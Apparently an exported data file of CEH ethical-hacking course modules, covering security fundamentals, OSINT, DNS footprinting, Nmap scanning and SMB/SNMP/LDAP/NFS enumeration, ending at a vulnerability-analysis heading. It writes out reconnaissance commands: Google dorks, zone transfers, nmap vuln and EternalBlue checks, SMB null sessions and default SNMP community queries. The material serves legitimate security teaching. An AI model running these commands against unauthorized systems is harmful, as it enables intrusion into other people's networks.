modules.title: Introduction to Ethical Hacking
modules.description: Covers the fundamentals of information security, ethical hacking concepts, the five phases of hacking, and the legal and regulatory framework that governs security testing. This module lays the foundation for all subsequent CEH topics.
objectives: Understand information security fundamentals including the CIA triad and security controls
Describe the five phases of ethical hacking methodology
Differentiate between types of hackers and threat actors
Identify key information security laws, standards, and regulations
Explain the role and responsibilities of a Certified Ethical Hacker

topics.title: Information Security Fundamentals
topics.content:
1.1 Introduction to Information Security

Information security is a multifaceted discipline dedicated to protecting data and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction. In the modern digital era, the reliance on interconnected systems and cloud infrastructure makes the implementation of robust security measures a critical requirement for organizations of all sizes.

The primary goal of information security is to guarantee business continuity, minimize business damage by preventing and minimizing the impact of security incidents, and maximize return on investments (ROI) and business opportunities.

1.2 The CIA Triad

At the core of information security lies the CIA Triad, a fundamental model designed to guide policies for information security within an organization. It consists of three key principles:

  • Confidentiality: This principle ensures that sensitive information is accessed only by an authorized person and kept away from those not authorized to possess it. Mechanisms to enforce confidentiality include data encryption (e.g., AES, RSA), strong access controls (like RBAC - Role-Based Access Control), biometric verification, and two-factor authentication (2FA). A breach of confidentiality could lead to identity theft, loss of intellectual property, and severe reputational damage.
  • Integrity: Integrity ensures that information is in a format that is true and correct to its original purposes. It guarantees that data has not been altered in an unauthorized manner during storage, processing, or transit. Tools used to ensure integrity include hashing algorithms (such as SHA-256 and MD5), digital signatures, and file integrity monitoring (FIM) systems. If a malicious actor alters financial records, the integrity of the data is compromised.
  • Availability: Availability ensures that information and resources are accessible to authorized users whenever they are needed. This involves maintaining hardware, performing hardware repairs immediately when needed, and maintaining a correctly functioning operating system environment that is free of software conflicts. Safeguards include redundancy (e.g., RAID storage), failover clusters, high-availability setups, and robust defense mechanisms against Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks.

1.3 Advanced Security Concepts (AAA and Non-repudiation)

Beyond the CIA triad, modern security architectures incorporate additional concepts:

  • Authentication: The process of verifying the identity of a user, device, or system. Examples include passwords, smart cards, and biometrics.
  • Authorization: Determines what an authenticated identity is allowed to do. It dictates access rights and privileges.
  • Accounting: The tracking of user activities, resource utilization, and events. This is crucial for auditing, billing, and forensic analysis.
  • Non-repudiation: A mechanism that proves the origin and integrity of data, ensuring that the sender cannot deny having sent a message and the recipient cannot deny having received it. Digital signatures and public key infrastructure (PKI) are the primary technologies used to enforce non-repudiation.

1.4 Defense in Depth

Defense in Depth is a comprehensive security strategy that employs multiple layers of security controls and countermeasures placed throughout an information technology system. The underlying concept is that if one security mechanism fails, another layer will thwart the attack. This approach involves:

  • Physical Security: Fences, security guards, biometric access to server rooms.
  • Network Security: Firewalls, Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), VLANs.
  • Host Security: Antivirus software, Host-based IDS (HIDS), OS hardening, patch management.
  • Application Security: Secure coding practices, Web Application Firewalls (WAF), input validation.
  • Data Security: Data at rest and in transit encryption, Data Loss Prevention (DLP) solutions.

topics.title: Ethical Hacking Concepts
topics.content:
2.1 Understanding Hackers and Threat Actors

The term "hacker" originally referred to a skilled programmer. Today, it categorizes individuals based on their intent, ethics, and authorization:

  • White Hat Hackers: Ethical hackers who possess the skills of malicious hackers but use them defensively. They are authorized to test systems and networks to identify vulnerabilities before they can be exploited maliciously.
  • Black Hat Hackers: Individuals who violate computer security for personal gain, malice, or ideological reasons. Their actions are illegal and unauthorized.
  • Gray Hat Hackers: Individuals who operate in a moral gray area. They may probe systems for vulnerabilities without authorization (like Black Hats) but usually do not exploit them for malicious purposes. They often report the flaws to the system owner, sometimes requesting a bounty.
  • Script Kiddies: Unskilled attackers who rely on pre-written scripts and automated tools (e.g., Low Orbit Ion Cannon) developed by others to launch attacks. They lack a deep understanding of the underlying technology.
  • Hacktivists: Attackers whose motivations are ideological, political, or social. They often deface websites, leak sensitive information, or launch DDoS attacks to promote their cause.
  • State-Sponsored Actors (Advanced Persistent Threats - APTs): Highly skilled, well-resourced groups backed by national governments. They engage in cyber espionage, intellectual property theft, and disruption of critical infrastructure. APTs are characterized by their stealth, sophisticated evasion techniques, and persistence over long periods.
  • Insider Threats: These originate from within the organization. A malicious insider (like a disgruntled employee) or a negligent insider can cause significant damage because they already have authorized access to internal systems.

2.2 Types of Security Testing

Security assessments and penetration tests are categorized based on the amount of information provided to the tester:

  • Black Box Testing (Zero-Knowledge): The tester has no prior knowledge of the target's internal infrastructure, source code, or network layout. This simulates a real-world external attack. It is time-consuming as the tester must perform extensive reconnaissance.
  • White Box Testing (Full-Knowledge): The tester has complete knowledge of the target environment, including network diagrams, source code, credentials, and configuration files. This allows for a thorough and comprehensive assessment of internal vulnerabilities.
  • Gray Box Testing (Partial-Knowledge): A combination of Black and White box testing. The tester has partial knowledge, such as user-level access or specific architectural details. This simulates an insider threat or an attacker who has already breached the perimeter.

2.3 Common Vulnerabilities

Ethical hackers must understand how vulnerabilities are exploited. For example, an Input Validation Flaw occurs when an application fails to properly sanitize user input. This can lead to attacks like SQL Injection (SQLi), Cross-Site Scripting (XSS), and Buffer Overflows.

topics.title: Hacking Methodology and Frameworks
topics.content:
3.1 The Five Phases of Ethical Hacking

The ethical hacking process follows a structured methodology comprising five distinct phases:

  1. Reconnaissance (Footprinting): This is the preparatory phase where the attacker gathers as much information as possible about the target.
    • Passive Reconnaissance: Gathering data without interacting directly with the target systems. Examples include using search engines (Google Dorks), querying WHOIS databases, examining social media profiles, and searching public records.
    • Active Reconnaissance: Involves direct interaction with the target. Examples include ping sweeps and basic port scans, though these risk detection by the target's IDS/IPS.
  2. Scanning and Enumeration: The attacker uses the information gathered during reconnaissance to probe the target network for active systems, open ports, and running services. Tools like Nmap, Nessus, and OpenVAS are used to identify potential attack vectors and vulnerabilities.
  3. Gaining Access (Exploitation): This is the actual attack phase. The attacker exploits the vulnerabilities identified in the previous phases to gain unauthorized access to the system or network. This could involve exploiting a buffer overflow, cracking passwords, or launching a phishing campaign.
  4. Maintaining Access: Once access is gained, the attacker aims to establish persistence. This involves installing backdoors, rootkits, or Trojan horses. In the context of the Cyber Kill Chain, this aligns with the Installation phase (establishing a foothold) and setting up Command and Control (C2) channels for remote administration.
  5. Covering Tracks: The final phase involves removing evidence of the intrusion to avoid detection and maintain persistent access. Attackers will clear event logs, modify auditing configurations, and hide files using techniques like steganography or alternate data streams (ADS).

3.2 Security Frameworks

Frameworks provide a structured approach to cybersecurity. The NIST Cybersecurity Framework (CSF) is widely adopted and consists of five core functions:

  • Identify: Develop an organizational understanding to manage cybersecurity risk to systems, assets, data, and capabilities.
  • Protect: Develop and implement appropriate safeguards to ensure delivery of critical infrastructure services.
  • Detect: Develop and implement appropriate activities to identify the occurrence of a cybersecurity event. This includes continuous monitoring and threat hunting.
  • Respond: Develop and implement appropriate activities to take action regarding a detected cybersecurity event.
  • Recover: Develop and implement appropriate activities to maintain plans for resilience and to restore any capabilities or services that were impaired due to a cybersecurity event.

topics.title: Security Controls
topics.content:
4.1 Classification of Security Controls

Security controls are countermeasures or safeguards designed to minimize risk and protect the CIA of information systems. They are categorized into three main types:

4.1.1 Physical Controls

These are physical safeguards that protect tangible assets, facilities, and personnel. Examples include:

  • Fences, gates, and bollards.
  • Security guards and receptionists.
  • Closed-Circuit Television (CCTV) cameras.
  • Biometric access systems for data centers.
  • HVAC systems and fire suppression equipment.

4.1.2 Technical (Logical) Controls

These involve the use of technology, software, and hardware to enforce security policies. Examples include:

  • Firewalls: Filter incoming and outgoing network traffic based on predefined rules.
  • Intrusion Detection Systems (IDS): Monitor network traffic for suspicious activity and known threats.
  • Encryption Protocols: Protect data at rest and in transit (e.g., TLS/SSL, IPsec).
  • Access Control Lists (ACLs): Determine which users or systems are granted or denied access to a resource.
  • Multi-Factor Authentication (MFA): Requires users to provide two or more verification factors to gain access.

4.1.3 Administrative Controls

Also known as managerial controls, these refer to the policies, procedures, and guidelines established by management to secure the organization. Examples include:

  • Security awareness training for employees.
  • Acceptable Use Policies (AUP).
  • Incident response plans and disaster recovery procedures.
  • Background checks for new hires.
  • Risk assessments and compliance audits.

4.2 Security Control Functions

Controls can also be classified by their function:

  • Preventive: Designed to stop an incident from occurring (e.g., firewalls, security guards).
  • Detective: Designed to identify and record an incident in progress or after it has occurred (e.g., IDS, audit logs).
  • Corrective: Designed to fix a system after an incident has occurred (e.g., restoring from backups, patching a vulnerability).
  • Deterrent: Designed to discourage individuals from violating security policies (e.g., warning banners, visible cameras).
  • Compensating: Used when a primary control is not feasible; provides an alternative layer of security.

topics.title: Information Security Laws and Standards
topics.content:
5.1 Legal and Regulatory Compliance

Operating as a Certified Ethical Hacker requires strict adherence to legal frameworks. Performing security testing without explicit, documented authorization is illegal. The Rules of Engagement (ROE) is a critical document that outlines the scope, objectives, acceptable techniques, reporting requirements, and legal protections for a penetration test. It ensures that the testing does not cause unintended disruption and that the ethical hacker is legally protected.

5.2 Key Legislation and Standards

Ethical hackers must be familiar with the following laws and regulations:

  • Computer Fraud and Abuse Act (CFAA): Enacted in 1986, this is the primary federal anti-hacking law in the United States. It criminalizes unauthorized access to computer systems, intentional damage to networks, and the trafficking of passwords.
  • General Data Protection Regulation (GDPR): A comprehensive privacy and security law drafted and passed by the European Union (EU). It imposes obligations onto organizations anywhere, so long as they target or collect data related to people in the EU. Key principles include data minimization, consent, and the right to be forgotten.
  • Health Insurance Portability and Accountability Act (HIPAA): A US federal law that establishes national standards for the protection of individuals' medical records and other personal health information (PHI).
  • Sarbanes-Oxley Act (SOX): Enacted in 2002, this US law aims to protect investors from the possibility of fraudulent accounting activities by corporations. It mandates strict reforms to improve financial disclosures and prevent accounting fraud. Section 404 requires management to assess the effectiveness of internal controls over financial reporting.
  • Payment Card Industry Data Security Standard (PCI DSS): An information security standard for organizations that handle branded credit cards from the major card schemes. The PCI Standard is mandated by the card brands but administered by the Payment Card Industry Security Standards Council. It requires strict controls like encrypting cardholder data and maintaining secure networks.
  • Federal Information Security Management Act (FISMA): A United States federal law passed in 2002 that made it a requirement for federal agencies to develop, document, and implement an agency-wide program to provide information security for the information and information systems that support the operations and assets of the agency.
  • Digital Millennium Copyright Act (DMCA): A US copyright law that criminalizes production and dissemination of technology, devices, or services intended to circumvent measures that control access to copyrighted works.

modules.title: Footprinting and Reconnaissance
modules.description: Explores passive and active reconnaissance techniques used to gather information about target organizations, including OSINT, DNS footprinting, Whois lookups, and social media intelligence gathering.
objectives: Perform passive and active reconnaissance against a target
Use OSINT tools and techniques to gather intelligence
Conduct DNS and Whois footprinting
Extract information from social media, websites, and email headers
Understand countermeasures against footprinting

topics.title: OSINT (Open Source Intelligence)
topics.content:
2.1 Introduction to OSINT

Open Source Intelligence (OSINT) refers to the collection, evaluation, and analysis of publicly available information to answer a specific intelligence question. In the context of ethical hacking, OSINT is the backbone of the passive reconnaissance phase. Because OSINT relies on publicly accessible data, it allows an attacker to gather critical information without interacting directly with the target's internal network, thereby minimizing the risk of triggering Intrusion Detection Systems (IDS) or logging mechanisms.

2.2 Key OSINT Concepts and Techniques

  • Search Engine Reconnaissance (Google Dorks): Advanced search operators are used to uncover hidden information, exposed directories, and sensitive files. Examples include:
    • site:target.com intitle:"index of" (finds directory listings)
    • filetype:pdf "confidential" site:target.com (finds confidential PDF documents)
    • inurl:admin login (finds administrative login pages)
  • Public Records and Databases: Exploring Edgar (for financial records of US public companies), patent databases, and government records can reveal organizational structures, key personnel, and physical locations.
  • Code Repositories: Developers often mistakenly commit sensitive information like API keys, database credentials, or hardcoded passwords to public repositories like GitHub, GitLab, or Bitbucket. Tools like TruffleHog or Gitrob are frequently used to automate the discovery of such secrets.
  • Deep Web and Dark Web Sources: Accessing forums, paste sites (e.g., Pastebin), and onion services can reveal leaked credentials, discussed vulnerabilities regarding the target, and mentions of the organization by threat actors.

topics.title: DNS Footprinting
topics.content:
3.1 Understanding DNS Footprinting

Domain Name System (DNS) footprinting is the process of gathering information about a target's DNS infrastructure. It helps attackers map the network, identify subdomains, locate mail servers, and determine the IP addresses associated with specific services.

3.2 DNS Record Types

To perform effective DNS footprinting, one must understand the various types of DNS records:

  • A (Address): Maps a hostname to an IPv4 address.
  • AAAA: Maps a hostname to an IPv6 address.
  • MX (Mail Exchange): Identifies the mail servers responsible for receiving emails on behalf of the domain.
  • NS (Name Server): Identifies the authoritative DNS servers for the domain.
  • CNAME (Canonical Name): Aliases one name to another.
  • TXT (Text): Contains arbitrary text. Often used for SPF (Sender Policy Framework), DKIM, and DMARC records to prevent email spoofing, as well as for domain verification.
  • SOA (Start of Authority): Contains administrative information about the zone, including the primary name server and the email of the domain administrator.
  • SRV (Service): Specifies the location of specific services (like SIP or LDAP) within the domain.

3.3 DNS Interrogation Tools and Commands

Several tools and commands are used to interrogate DNS servers:

  • nslookup: A basic command-line tool. Example: nslookup -type=mx target.com (queries for MX records).
  • dig: A more powerful and flexible DNS lookup utility. Example: dig ANY target.com (requests all record types).
  • host: A simple utility for performing DNS lookups. Example: host -t ns target.com.

3.4 DNS Zone Transfers (AXFR)

A zone transfer is the process of copying the entire DNS zone file from a primary name server to a secondary name server. If a DNS server is misconfigured to allow zone transfers to any IP address, an attacker can obtain a complete map of the organization's network architecture. The command used for this is often dig axfr target.com @ns1.target.com.

topics.title: Whois and Network Footprinting
topics.content:
4.1 WHOIS Lookups

WHOIS is a query and response protocol used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name or an IP address block. A WHOIS query can reveal:

  • Registrar details: Where the domain was registered.
  • Registrant details: The name, organization, address, and contact information of the domain owner.
  • Administrative and Technical contacts: Potential targets for social engineering attacks.
  • Name servers: Pointing to where the DNS records are hosted.
  • Creation and Expiration dates: Useful for predicting when a domain might expire (potential for domain hijacking).

While privacy protection services often mask this information, historical WHOIS data can sometimes reveal the original registrant details.

4.2 Network Footprinting

Network footprinting involves mapping the target's network infrastructure based on IP address allocations. Key techniques include:

  • ARIN/RIPE/APNIC queries: Querying Regional Internet Registries (RIRs) to find the blocks of IP addresses assigned to the target organization. This defines the scope of the target network.
  • Traceroute: A diagnostic tool used to determine the path packets take from the source to the destination. It helps identify intermediate routers, firewalls, and the general network topology. Example command: tracert target.com (Windows) or traceroute target.com (Linux).
  • BGP Looking Glasses: Using public BGP routers to view routing tables and understand how the target's autonomous system (AS) connects to the broader internet.

topics.title: Website and Email Footprinting
topics.content:
5.1 Website Footprinting

Website footprinting involves analyzing the target organization's web presence to extract sensitive information, understand the underlying technologies, and identify potential attack vectors.

  • Analyzing HTML Source Code: Inspecting the source code for hidden fields, comments (which may contain developer notes, internal IP addresses, or credentials), and structural information.
  • Technology Stack Identification: Tools like Wappalyzer or BuiltWith can identify the CMS (e.g., WordPress, Drupal), web server (e.g., Apache, Nginx), programming languages (e.g., PHP, ASP.NET), and JavaScript libraries used by the site. This helps in searching for known vulnerabilities associated with those specific versions.
  • Mirroring Websites: Tools like HTTrack allow an attacker to download the entire website for offline analysis, avoiding continuous interaction with the target server.
  • Archive Analysis: Using services like the Wayback Machine (archive.org) to view older versions of the website. This can reveal pages or features that were meant to be hidden or removed but are still accessible via their original URLs.

5.2 Email Footprinting

Email footprinting focuses on gathering information about the target's email infrastructure and personnel.

  • Email Header Analysis: Examining the headers of an email received from the target organization. Headers reveal the path the email took (Received fields), the mail servers involved, internal IP addresses, and the email client used (User-Agent or X-Mailer). This is critical for understanding the internal network topology.
  • Email Harvesting: Using tools like TheHarvester or Hunter.io to collect email addresses associated with the target domain. This information is primarily used to build target lists for phishing campaigns and social engineering attacks.
  • SPF, DKIM, and DMARC Verification: Analyzing these DNS records helps attackers understand the organization's email security posture and determine if email spoofing is a viable attack vector.

topics.title: Social Media Intelligence (SOCMINT)
topics.content:
6.1 Understanding SOCMINT

Social Media Intelligence (SOCMINT) is the process of gathering and analyzing data from social media platforms (e.g., LinkedIn, Twitter, Facebook, Instagram). In ethical hacking, it is a crucial component of the reconnaissance phase, primarily used to build profiles of individuals within the target organization for social engineering and spear-phishing attacks.

6.2 Key SOCMINT Objectives

  • Employee Profiling: Identifying key personnel, such as IT administrators, executives, and HR staff. LinkedIn is particularly valuable for discovering an employee's role, skills, and employment history, which can indicate the technologies used within the company.
  • Relationship Mapping: Understanding the connections between employees, vendors, and partners. An attacker might compromise a less secure partner to gain access to the primary target.
  • Information Leakage: Employees may inadvertently disclose sensitive information, such as photos of the workplace showing access badges (useful for cloning), server racks, or whiteboards with confidential project details. Check-ins can reveal physical locations and routines.
  • Behavioral Analysis: Analyzing an individual's interests, hobbies, and communication style to craft highly convincing and personalized phishing emails.

6.3 Mitigation Strategies

To defend against SOCMINT, organizations must implement robust security awareness training. Employees should be educated on the risks of oversharing, how to configure privacy settings on personal and professional accounts, and the importance of verifying the identity of connections, especially those claiming to be colleagues or vendors.

v13Updates: Advanced OSINT with machine learning classifiers

modules.title: Scanning Networks
modules.description: Covers network scanning methodologies including host discovery, port scanning, service enumeration, OS fingerprinting, and vulnerability scanning using tools like Nmap.
objectives: Explain the different types of network scans and their purposes
Perform host discovery, port scanning, and service detection using Nmap
Understand TCP/IP communication and the three-way handshake
Conduct OS fingerprinting and banner grabbing
Identify scanning countermeasures

topics.title: Network Scanning Methodology & Port Responses
topics.content:
1.1 Scanning Methodology

Network scanning is the critical second phase of the ethical hacking methodology. It transitions from the passive intelligence gathering of reconnaissance to active probing of the target infrastructure. The primary objectives are to discover live hosts, identify open ports, determine the services running on those ports, and map the network topology.

The standard scanning methodology involves several steps:

  1. Check for Live Systems: Using techniques like ICMP ping sweeps (e.g., nmap -sn 192.168.1.0/24) or ARP sweeps on a local network to identify which IP addresses are active.
  2. Port Scanning: Probing the live hosts to determine which TCP and UDP ports are open and listening.
  3. Service Identification (Banner Grabbing): Interrogating the open ports to identify the specific service (e.g., Apache HTTP Server, OpenSSH) and its version number.
  4. Vulnerability Scanning: Using automated tools to compare the identified services and versions against a database of known vulnerabilities (CVEs).
  5. Network Diagramming: Creating a visual map of the network architecture based on the gathered data.

1.2 Understanding Port Responses

When an attacker sends a probe to a target port, the response depends on the protocol (TCP or UDP), the state of the port, and any intervening firewalls. The interpretation of these responses is fundamental to port scanning.

TCP Port Responses (The Three-Way Handshake)

  • Open Port: If a SYN packet is sent to an open port, the target responds with a SYN/ACK packet. The attacker then typically sends a RST (Reset) packet to tear down the connection before it's fully established (this is the basis of a Stealth/Half-Open scan).
  • Closed Port: If a SYN packet is sent to a closed port, the target responds with a RST (Reset) packet, indicating that no service is listening.
  • Filtered Port: If a SYN packet is sent and no response is received, or an ICMP Unreachable error is returned, it typically indicates that a firewall or packet filter is blocking the probe. The scanner cannot determine if the port is open or closed.

UDP Port Responses

UDP scanning is generally more difficult and slower than TCP scanning because UDP is a connectionless protocol.

  • Open/Filtered Port: If a UDP packet is sent and no response is received, the port is marked as "open|filtered." It might be open and simply not responding, or a firewall might be dropping the packet.
  • Closed Port: If an ICMP Port Unreachable message is returned, the port is considered closed.

topics.title: Nmap Scan Types and Techniques
topics.content:
2.1 Introduction to Nmap

Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. Its versatility stems from the variety of scan types it supports, allowing an ethical hacker to adapt to different network environments and evasion requirements.

2.2 Core Scan Types

  • TCP Connect Scan (-sT): This is the most basic and reliable scan. Nmap uses the operating system's network API to complete a full TCP three-way handshake (SYN, SYN/ACK, ACK). It does not require raw socket privileges (root/administrator access). However, because the connection is fully established, it is highly visible and almost certainly logged by the target system's applications and IDS.
  • TCP SYN Scan / Stealth Scan (-sS): Also known as a half-open scan, this is the default scan when run with root privileges. Nmap sends a SYN packet and waits for a response. If a SYN/ACK is received, the port is open. Nmap immediately sends a RST (Reset) to tear down the connection. Because the three-way handshake is never completed, the connection is rarely logged by the application, making it "stealthier" than a Connect scan. Example: nmap -sS -p 80,443 192.168.1.100.
  • UDP Scan (-sU): Used to identify open UDP ports (e.g., DNS, SNMP, DHCP). Nmap sends a UDP packet to the target ports. If an ICMP port unreachable error (type 3, code 3) is returned, the port is closed. If no response is received, the state is open|filtered. Example: nmap -sU -p 53,161 192.168.1.100.

2.3 Advanced and Evasion Scans

These scans manipulate TCP flags to elicit specific responses, primarily used to map firewall rules or evade basic packet filters. They often rely on ambiguities in the TCP RFC.

  • XMAS Scan (-sX): Sets the FIN, PSH, and URG flags simultaneously (lighting up the packet "like a Christmas tree"). If the port is closed, a RST is sent back. If the port is open, the packet is typically ignored (no response).
  • FIN Scan (-sF): Sets only the FIN flag. Similar to the XMAS scan, it expects a RST from a closed port and no response from an open port.
  • NULL Scan (-sN): Sends a packet with no TCP flags set. Again, closed ports respond with RST, open ports ignore it.
  • ACK Scan (-sA): This scan is NOT used to determine if a port is open or closed. Instead, it is used to map firewall rule sets. It sends an ACK packet; if a RST is received, the port is considered "unfiltered" (meaning it reached the destination). If no response or an ICMP unreachable error is received, the port is "filtered" by a firewall.

topics.title: OS Fingerprinting and Banner Grabbing
topics.content:
3.1 Operating System (OS) Fingerprinting

OS Fingerprinting is the process of determining the operating system running on a remote target system. This is crucial because vulnerabilities and exploitation techniques are often OS-specific.

  • Active Fingerprinting: This involves sending specially crafted, anomalous packets (such as unusual TCP flag combinations, malformed options, or specific ICMP requests) to the target and analyzing the responses. Different operating systems implement the TCP/IP stack slightly differently. By comparing the target's unique responses against a database of known signatures, tools like Nmap can accurately identify the OS, its version, and sometimes even the device type (e.g., router, printer).
    • Command: nmap -O 192.168.1.100
  • Passive Fingerprinting: This involves monitoring network traffic without actively sending packets to the target. It analyzes fields like the Time to Live (TTL), initial Window Size, and TCP options in captured packets to deduce the OS. This method is stealthy and avoids detection by IDS/IPS. Tools like p0f are commonly used for passive fingerprinting.

3.2 Banner Grabbing (Service Enumeration)

While port scanning identifies open ports, banner grabbing identifies the specific software and version running on those ports. This is vital for finding known vulnerabilities.

  • Active Banner Grabbing: Establishing a connection with the target service and reading the initial response (the "banner"). For example, connecting to port 21 (FTP) or port 80 (HTTP) and capturing the server's welcome message or HTTP headers.
    • Tools: Telnet (telnet target.com 80), Netcat (nc -nv target.com 22), or Nmap's version detection (nmap -sV target.com).
    • Administrators often change banners (banner spoofing or obfuscation) to mislead attackers.
  • Passive Banner Grabbing: Similar to passive OS fingerprinting, this involves sniffing network traffic to capture banners as they are transmitted during legitimate communication.

topics.title: Vulnerability Scanning with Nmap
topics.content:
4.1 Introduction to Vulnerability Scanning

Vulnerability scanning automates the process of identifying known security flaws within a target system or network. It builds upon the findings of port scanning and service enumeration. The scanner compares the identified services, versions, and configurations against a comprehensive database of known vulnerabilities, such as the Common Vulnerabilities and Exposures (CVE) dictionary.

The goal is to identify misconfigurations (e.g., default passwords, open file shares), outdated software (missing patches), and inherent flaws (e.g., buffer overflows) before they can be exploited.

4.2 The Nmap Scripting Engine (NSE)

While Nmap is primarily a port scanner, its true power lies in the Nmap Scripting Engine (NSE). NSE allows users to write (and share) simple scripts in the Lua programming language to automate a wide variety of networking tasks, including advanced vulnerability detection and even exploitation.

  • Categorization: Scripts are grouped into categories based on their function. Common categories include:
    • default: Safe, basic scripts run automatically when using the -sC flag.
    • vuln: Scripts specifically designed to check for known vulnerabilities.
    • exploit: Scripts that actively attempt to exploit a vulnerability.
    • auth: Scripts for dealing with authentication credentials (e.g., brute-forcing).
    • discovery: Scripts for querying registries, directories, and SNMP.

4.3 Practical Nmap Vulnerability Scanning Commands

Ethical hackers leverage NSE to perform targeted vulnerability assessments:

  • General Vulnerability Scan: To run all scripts in the 'vuln' category against a target:
    • nmap --script vuln 192.168.1.100
  • Specific Vulnerability Check: If a specific service is identified (e.g., SMB on port 445), an attacker can check for specific flaws like MS17-010 (EternalBlue):
    • nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100
  • Combining Flags: A comprehensive command often combines version detection with script execution:
    • nmap -sV --script=vuln -p 80,443 target.com

It is important to note that vulnerability scanning, especially using the vuln or exploit categories in Nmap, is highly intrusive and can cause system instability or crashes. It should only be performed with explicit authorization.

v13Updates: Automated vulnerability correlation with threat intelligence

modules.title: Enumeration
modules.description: Details the techniques used to extract detailed information from target systems including usernames, network shares, services, and configurations through various enumeration protocols.
objectives: Understand the purpose and techniques of enumeration
Perform NetBIOS, SNMP, LDAP, and DNS enumeration
Enumerate SMB shares, NFS exports, and SMTP users
Conduct Active Directory enumeration
Apply enumeration countermeasures

topics.title: Enumeration Concepts
topics.content:
1.1 What is Enumeration?

Enumeration is the process of extracting user names, machine names, network resources, shares, and services from a system. Unlike reconnaissance (which is mostly passive) and scanning (which identifies open ports), enumeration involves active, intrusive connections to the target systems to query them for detailed information. This phase is critical because the information gathered here directly feeds into the exploitation phase.

1.2 Goals of Enumeration

During enumeration, an attacker attempts to identify:

  • Network resources and shares (SMB/NFS).
  • Users and groups (useful for brute-force attacks and privilege escalation).
  • Routing tables and machine names.
  • Audit and service settings.
  • Applications and banners.

1.3 Enumeration Techniques

The techniques used depend heavily on the operating system and the services exposed. The most commonly enumerated services include NetBIOS/SMB (Windows), SNMP (network devices), LDAP (Active Directory), and NFS (Linux/Unix).

topics.title: NetBIOS and SMB Enumeration
topics.content:
2.1 NetBIOS Enumeration

Network Basic Input/Output System (NetBIOS) provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network. It traditionally runs over TCP port 139 and UDP port 137. By querying NetBIOS, an attacker can obtain:

  • List of computers that belong to a domain.
  • List of shares on individual hosts.
  • Policies and passwords.

Tools used for NetBIOS enumeration include nbtstat (Windows command line) and nbtscan (Linux). For example, nbtstat -A 192.168.1.100 will return the NetBIOS name table of the remote host.

2.2 SMB Enumeration

Server Message Block (SMB) operates on TCP port 445 (or 139 over NetBIOS) and is used for providing shared access to files, printers, and serial ports. SMB enumeration is highly effective against Windows environments.

  • Null Sessions: An unauthenticated connection to the hidden IPC$ share (Inter-Process Communication share). Historically (especially in older Windows versions), an attacker could establish a null session (net use \192.168.1.100\IPC$ "" /u:"") and then use tools to dump password policies, user lists, and group information. Modern Windows versions have null sessions disabled by default, but misconfigurations still exist.
  • Tools for SMB Enumeration:
    • enum4linux: A Linux tool specifically designed for enumerating information from Windows and Samba systems. It extracts users, groups, shares, and password policies.
    • smbclient: An FTP-like client to access SMB/CIFS resources on servers. Example: smbclient -L //192.168.1.100 -N (lists shares using a null session).
    • Nmap NSE Scripts: nmap -p 445 --script smb-enum-shares,smb-enum-users target_ip

topics.title: SNMP Enumeration
topics.content:
3.1 Simple Network Management Protocol (SNMP)

SNMP is used for monitoring and managing devices on IP networks (routers, switches, servers, printers). It operates over UDP ports 161 (queries) and 162 (traps/alerts). SNMP manages a hierarchical database of information known as the Management Information Base (MIB). The variables within the MIB are identified by Object Identifiers (OIDs).

3.2 SNMP Versions and Security Flaws

  • SNMPv1: The original version. Highly insecure because community strings (passwords) are transmitted in plaintext.
  • SNMPv2c: Improved performance but still transmits community strings in plaintext.
  • SNMPv3: Adds cryptographic security (authentication and encryption), making it significantly more secure.

3.3 SNMP Enumeration Techniques

If an attacker can guess or discover the SNMP community string (often defaulted to "public" for read access and "private" for read/write access), they can extract massive amounts of information about the device and the network it connects to, including routing tables, ARP caches, open ports, and running processes.

  • Tools:
    • snmpwalk: A tool that uses SNMP GETNEXT requests to query a network entity for a tree of information. Example: snmpwalk -v 2c -c public 192.168.1.1.
    • snmpcheck: Automates the process of gathering information via SNMP.
    • onesixtyone: A fast SNMP scanner used to brute-force community strings.

topics.title: LDAP and DNS Enumeration
topics.content:
4.1 LDAP Enumeration

The Lightweight Directory Access Protocol (LDAP) is used for accessing and maintaining distributed directory information services over an IP network (like Microsoft Active Directory). It runs on TCP port 389 (unencrypted) or 636 (LDAPS, encrypted).

If an LDAP server allows anonymous binds or if the attacker has low-level credentials, they can query the directory to enumerate all users, groups, computer names, organizational units (OUs), and sometimes even custom attributes that might contain sensitive data.

  • Tools: ldapsearch, ADExplorer (Sysinternals), and Nmap scripts (ldap-search).

4.2 DNS Enumeration (Advanced)

While basic DNS footprinting happens during reconnaissance, DNS enumeration dives deeper to map the internal network if possible.

  • Zone Transfers (AXFR): If misconfigured, a DNS server will send a copy of the entire zone file to any requester. This reveals every configured subdomain and IP mapping.
  • DNS Cache Snooping: Querying a DNS server to find out if it has a specific DNS record cached, indicating that a user on that network has recently visited that site.
  • DNSSEC Zone Walking: If a domain uses DNSSEC (specifically NSEC records), an attacker can systematically "walk" the zone to discover all names in the zone, bypassing the intended security of standard DNS.

topics.title: NFS Enumeration
topics.content:
5.1 Network File System (NFS)

NFS is a distributed file system protocol primarily used in Unix/Linux environments that allows a user on a client computer to access files over a computer network much like local storage. It typically relies on the RPCbind/Portmapper service running on TCP/UDP port 111, while NFS itself often runs on port 2049.

5.2 NFS Enumeration Techniques

An attacker looks for exported file systems that are misconfigured, specifically those exported to everyone (denoted by an asterisk * in the /etc/exports file) or with weak permissions.

  • Querying RPC: Using rpcinfo -p 192.168.1.100 to identify which RPC services are running and on which ports.
  • Showing Exports: The command showmount -e 192.168.1.100 queries the mount daemon on the target to display the list of exported file systems and the clients allowed to mount them.
  • Mounting the Share: If a share is exported without authentication, an attacker can mount it locally: mount -t nfs 192.168.1.100:/shared_folder /mnt/local_folder. Once mounted, the attacker can browse the files, potentially finding sensitive configuration files, SSH keys, or passwords.

v13Updates: Zero Trust impact on legacy enumeration techniques

modules.title: Vulnerability Analysis
modules.description: Explores the vulnerability management lifecycle, scoring systems (CVSS), and the use of automated scanning tools to identify and prioritize system weaknesses.
objectives: Understand the vulnerability management lifecycle
Differentiate between vulnerability assessment and penetration testing
Interpret CVSS v3.1 scores and metrics
Perform vulnerability scanning using tools like Nessus
Analyze scan results and prioritize remediation

topics.title: Vulnerability Management and Concepts
topics.content:
1.1 Vulnerability Management Lifecycle

